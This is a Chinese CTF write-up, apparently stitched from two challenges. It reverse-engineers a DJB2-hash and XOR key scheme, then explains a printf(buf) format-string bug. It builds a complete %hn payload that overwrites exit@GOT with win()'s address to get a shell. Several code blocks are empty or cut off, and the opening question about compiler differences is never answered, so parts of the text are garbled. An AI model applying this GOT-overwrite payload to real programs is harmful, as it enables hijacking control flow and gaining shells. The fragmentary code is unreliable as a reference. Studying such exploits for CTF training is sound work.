思考🤔：为什么会有这样的差异

根据ChatGPT大人的指导，锁定了以下可能的原因：

1. 编译器默认char 为 unsigned char 或 signed char 导致的差异
2. 不同编译器的随机数算法不同

于是有了以下测试代码

小知识：

在IDA中，十六进制数的格式为xxh，或者0xxh。后者带0前缀的版本是为了防止歧义。

因为在汇编语法里，如果十六进制数以字母开头，可能会被当成符号名，而不是数字。

```c
__int64 __fastcall sub_140001120(unsigned __int8 *a1, __int64 a2)
```

它的逻辑：

初始值 5381

每次 hash = hash * 33 + 当前字符

这是经典的 **DJB2 hash**

于是我们知道了v2 = djb2_hash(Str, 64) ⇔ key = hash(原始输入)

c++代码演示：
```cpp
#include <cstdint>
#include <cstddef>

uint32_t djb2_hash(const uint8_t* data, size_t len) {
    uint32_t hash = 5381;

    for (size_t i = 0; i < len; ++i) {
        hash = hash * 33 + data[i];
    }

    return hash;
}
```

```c
    result = (_BYTE *)(a3 ^ ((1 << v7) | __ROL4__(a3, v7)));
    a3 = (unsigned int)result;
```
a3是上面得到的key，然后代码的意思是：

每次取 key 的低 8 位，与当前字符 XOR

然后 key 右移 8 位，处理下一个字符

又key为32位，所以一轮处理4个字符。

处理完一组，就会更新key。

c++代码演示：
```cpp
#include <cstdint>
#include <cstddef>

uint32_t rol32(uint32_t value, unsigned int shift) {
    shift &= 31;
    return (value << shift) | (value >> (32 - shift));
}

void encrypt(uint8_t* data, size_t len, uint32_t key) {
    uint8_t shift = 0;
    size_t pos = 0;

    while (len > 0) {
        uint32_t current_key = key;

        uint8_t block_size;
        if (len <= 4) {
            block_size = static_cast<uint8_t>(len);
        } else {
            block_size = 4;
        }

        for (uint8_t i = 0; i < block_size; ++i) {
            data[pos] ^= static_cast<uint8_t>(current_key & 0xFF);
            current_key >>= 8;
            ++pos;
        }

        len -= block_size;

        shift = static_cast<uint8_t>((shift + 5) % 32);
        key = key ^ ((1u << shift) | rol32(key, shift));
    }
}
```

```python
    h = 5381
    for b in data:
        h = (h * 33 + b) & 0xFFFFFFFF
    return h

            current_key >>= 8
            pos += 1

        key = (key ^ ((1 << shift) | rol32(key, shift))) & 0xFFFFFFFF
```

注意到：

```c

```

明显这是一个有缺陷的代码。正常情况下，如果程序只是想把用户输入的名字打印出来，应该写成：

```c
printf("%s", buf);
```

也就是说，`buf` 应该只作为一个普通字符串参数被输出。

但是这里程序直接写成了：

```c
printf(buf);
```

这就意味着，用户输入的内容会被 `printf` 当成**格式化字符串**来解析。

举个例子，如果我们输入普通字符串：

```text
hello
```

那么程序只会正常输出：

```text
hello
```

看起来没有任何问题。

但是如果我们输入：

```text
%x.%x.%x.%x
```

情况就不同了。`printf` 会把 `%x` 当成格式控制符，尝试从栈上读取参数并以十六进制形式打印出来。可是程序实际只传入了一个参数 `buf`，并没有给后面的 `%x` 提供对应参数，于是 `printf` 就会继续从当前栈空间中取值，导致栈上数据被泄露。

因此，`printf(buf)` 会造成典型的**格式化字符串漏洞**。

格式化字符串漏洞常见的能力主要有两种：

1. 使用 `%x`、`%p` 等格式符读取栈上的数据；
2. 使用 `%n` 向指定地址写入数据。

其中 `%n` 是利用的关键。它的作用不是打印内容，而是把当前已经输出的字符数量写入到对应地址中。例如：

```c
int x = 0;
printf("AAAA%n", &x);
```

这里在执行到 `%n` 时，`printf` 已经输出了 4 个字符，所以变量 `x` 会被写成 `4`。

也就是说，如果我们能够控制 `%n` 对应的参数，让它指向某个目标地址，就可以向该地址写入数据。进一步地，如果目标地址选择为某个 GOT 表项，就可以劫持程序后续的函数调用流程。

回到本题，`printf(buf)` 后面紧跟着：

```c
exit(0);
```

所以一个很自然的利用思路是：

```text
利用 printf(buf) 的格式化字符串漏洞
修改 exit@GOT 的内容为 win() 的地址
```

这样一来，程序执行完 `printf(buf)` 后，原本应该调用 `exit(0)` 正常退出；但由于 `exit@GOT` 已经被我们改成了 `win()` 的地址，所以实际执行流程会跳转到 `win()`，从而触发后门函数。

本题的利用链可以概括为：

```text
故意输掉井字棋
→ 进入输入名字流程
→ 触发 printf(buf) 格式化字符串漏洞
→ 覆盖 exit@GOT 为 win()
→ 程序调用 exit(0)
→ 实际跳转到 win()
→ 获得 shell / 读取 flag
```

于是乎，接下来要做的，就是找到 exit@GOT 的位置和printf()格式化字符串的参数偏移，然后构造 payload，把 exit() 的跳转目标改成 win()。

我们先使用这样的payload去寻找printf()格式化字符串的参数偏移：
```

```
为什么这么构造呢？

AAAA的十六进制码是41414141，具有明显的标记特征。

让AAAA先被读取到栈上，然后再使用重复的%x,就能读取到栈上的数据了

接下来要做的就是覆盖 `exit@GOT`。

在 IDA 中可以得到两个关键地址：

```python
win = 0x080491E6
exit_got = 0x0804C01C
```

我们的目标是把 `exit@GOT` 中保存的地址改成 `win()` 的地址。这样程序后面执行：

```c
exit(0);
```

时，实际控制流就会跳转到 `win()`。

---

在 32 位小端序下，`win()` 的地址：

```text
0x080491E6
```

在内存中应当写成：

```text
E6 91 04 08
```

也就是说，需要完成两次 2 字节写入：

```text
0x0804C01C 处写入 0x91E6
0x0804C01E 处写入 0x0804
```

之所以拆成两次写，是因为直接使用 `%n` 一次性写入 4 字节并不方便。`%n` 写入的是“当前已经输出的字符数”，如果想一次性写入 `0x080491E6`，就需要让 `printf` 输出一个极大的字符数量，显然不现实。

因此这里选择使用 `%hn` 分两次写入。

`%n`、`%hn`、`%hhn` 的区别大致如下：

```text
%n    写入 4 字节
%hn   写入 2 字节
%hhn  写入 1 字节
```

本题中使用 `%hn`，将 `win()` 地址拆成两个 2 字节：

```text
高 2 字节：0x0804
低 2 字节：0x91E6
```

所以 payload 开头需要放入两个目标地址：

```python
payload = b'\x1e\xc0\x04\x08\x1c\xc0\x04\x08'
```

其中：

```text
\x1e\xc0\x04\x08  ->  0x0804C01E，也就是 exit@GOT + 2
\x1c\xc0\x04\x08  ->  0x0804C01C，也就是 exit@GOT
```

又因为前面测得 `offset = 6`，所以这两个地址会被 `printf` 当作第 6 个和第 7 个参数：

```text
第 6 个参数 -> 0x0804C01E
第 7 个参数 -> 0x0804C01C
```

于是：

```text
%6$hn
```

表示把当前已经输出的字符数写入第 6 个参数指向的地址，也就是：

```c
*(short *)0x0804C01E = 当前已输出字符数;
```

而：

```text
%7$hn
```

表示把当前已经输出的字符数写入第 7 个参数指向的地址，也就是：

```c
*(short *)0x0804C01C = 当前已输出字符数;
```

---

接下来需要精确控制 `printf` 的输出字符数。

payload 开头的两个地址一共占 8 个字节，因此在处理后续格式化字符串之前，`printf` 已经输出了 8 个字符。

首先要向 `exit@GOT + 2` 写入：

```text
0x0804 = 2052
```

由于前面已经输出了 8 个字符，所以还需要继续输出：

```text
2052 - 8 = 2044
```

因此构造：

```text
%2044c%6$hn
```

执行到 `%6$hn` 时，当前总输出字符数正好是 `0x0804`，于是完成：

```c
*(short *)0x0804C01E = 0x0804;
```

接着还要向 `exit@GOT` 写入：

```text
0x91E6 = 37350
```

此时已经输出了 `0x0804` 个字符，所以还需要继续输出：

```text
0x91E6 - 0x0804 = 35298
```

因此继续构造：

```text
%35298c%7$hn
```

执行到 `%7$hn` 时，当前总输出字符数正好是 `0x91E6`，于是完成：

```c
*(short *)0x0804C01C = 0x91E6;
```

最终 payload 可以理解为：

```python
payload  = p32(exit_got + 2)
payload += p32(exit_got)
payload += b"%2044c%6$hn"
payload += b"%35298c%7$hn"
```

展开后类似：

```python
b'\x1e\xc0\x04\x08\x1c\xc0\x04\x08%2044c%6$hn%35298c%7$hn'
```

当这段内容被 `printf(buf)` 解析完成后，`exit@GOT` 处的 4 字节内容就会变成：

```text
E6 91 04 08
```

按照小端序解释，这正是：

```text
0x080491E6
```

也就是 `win()` 的地址。

因此，程序后续执行 `exit(0)` 时，就会跳转到 `win()`，从而触发后门函数。
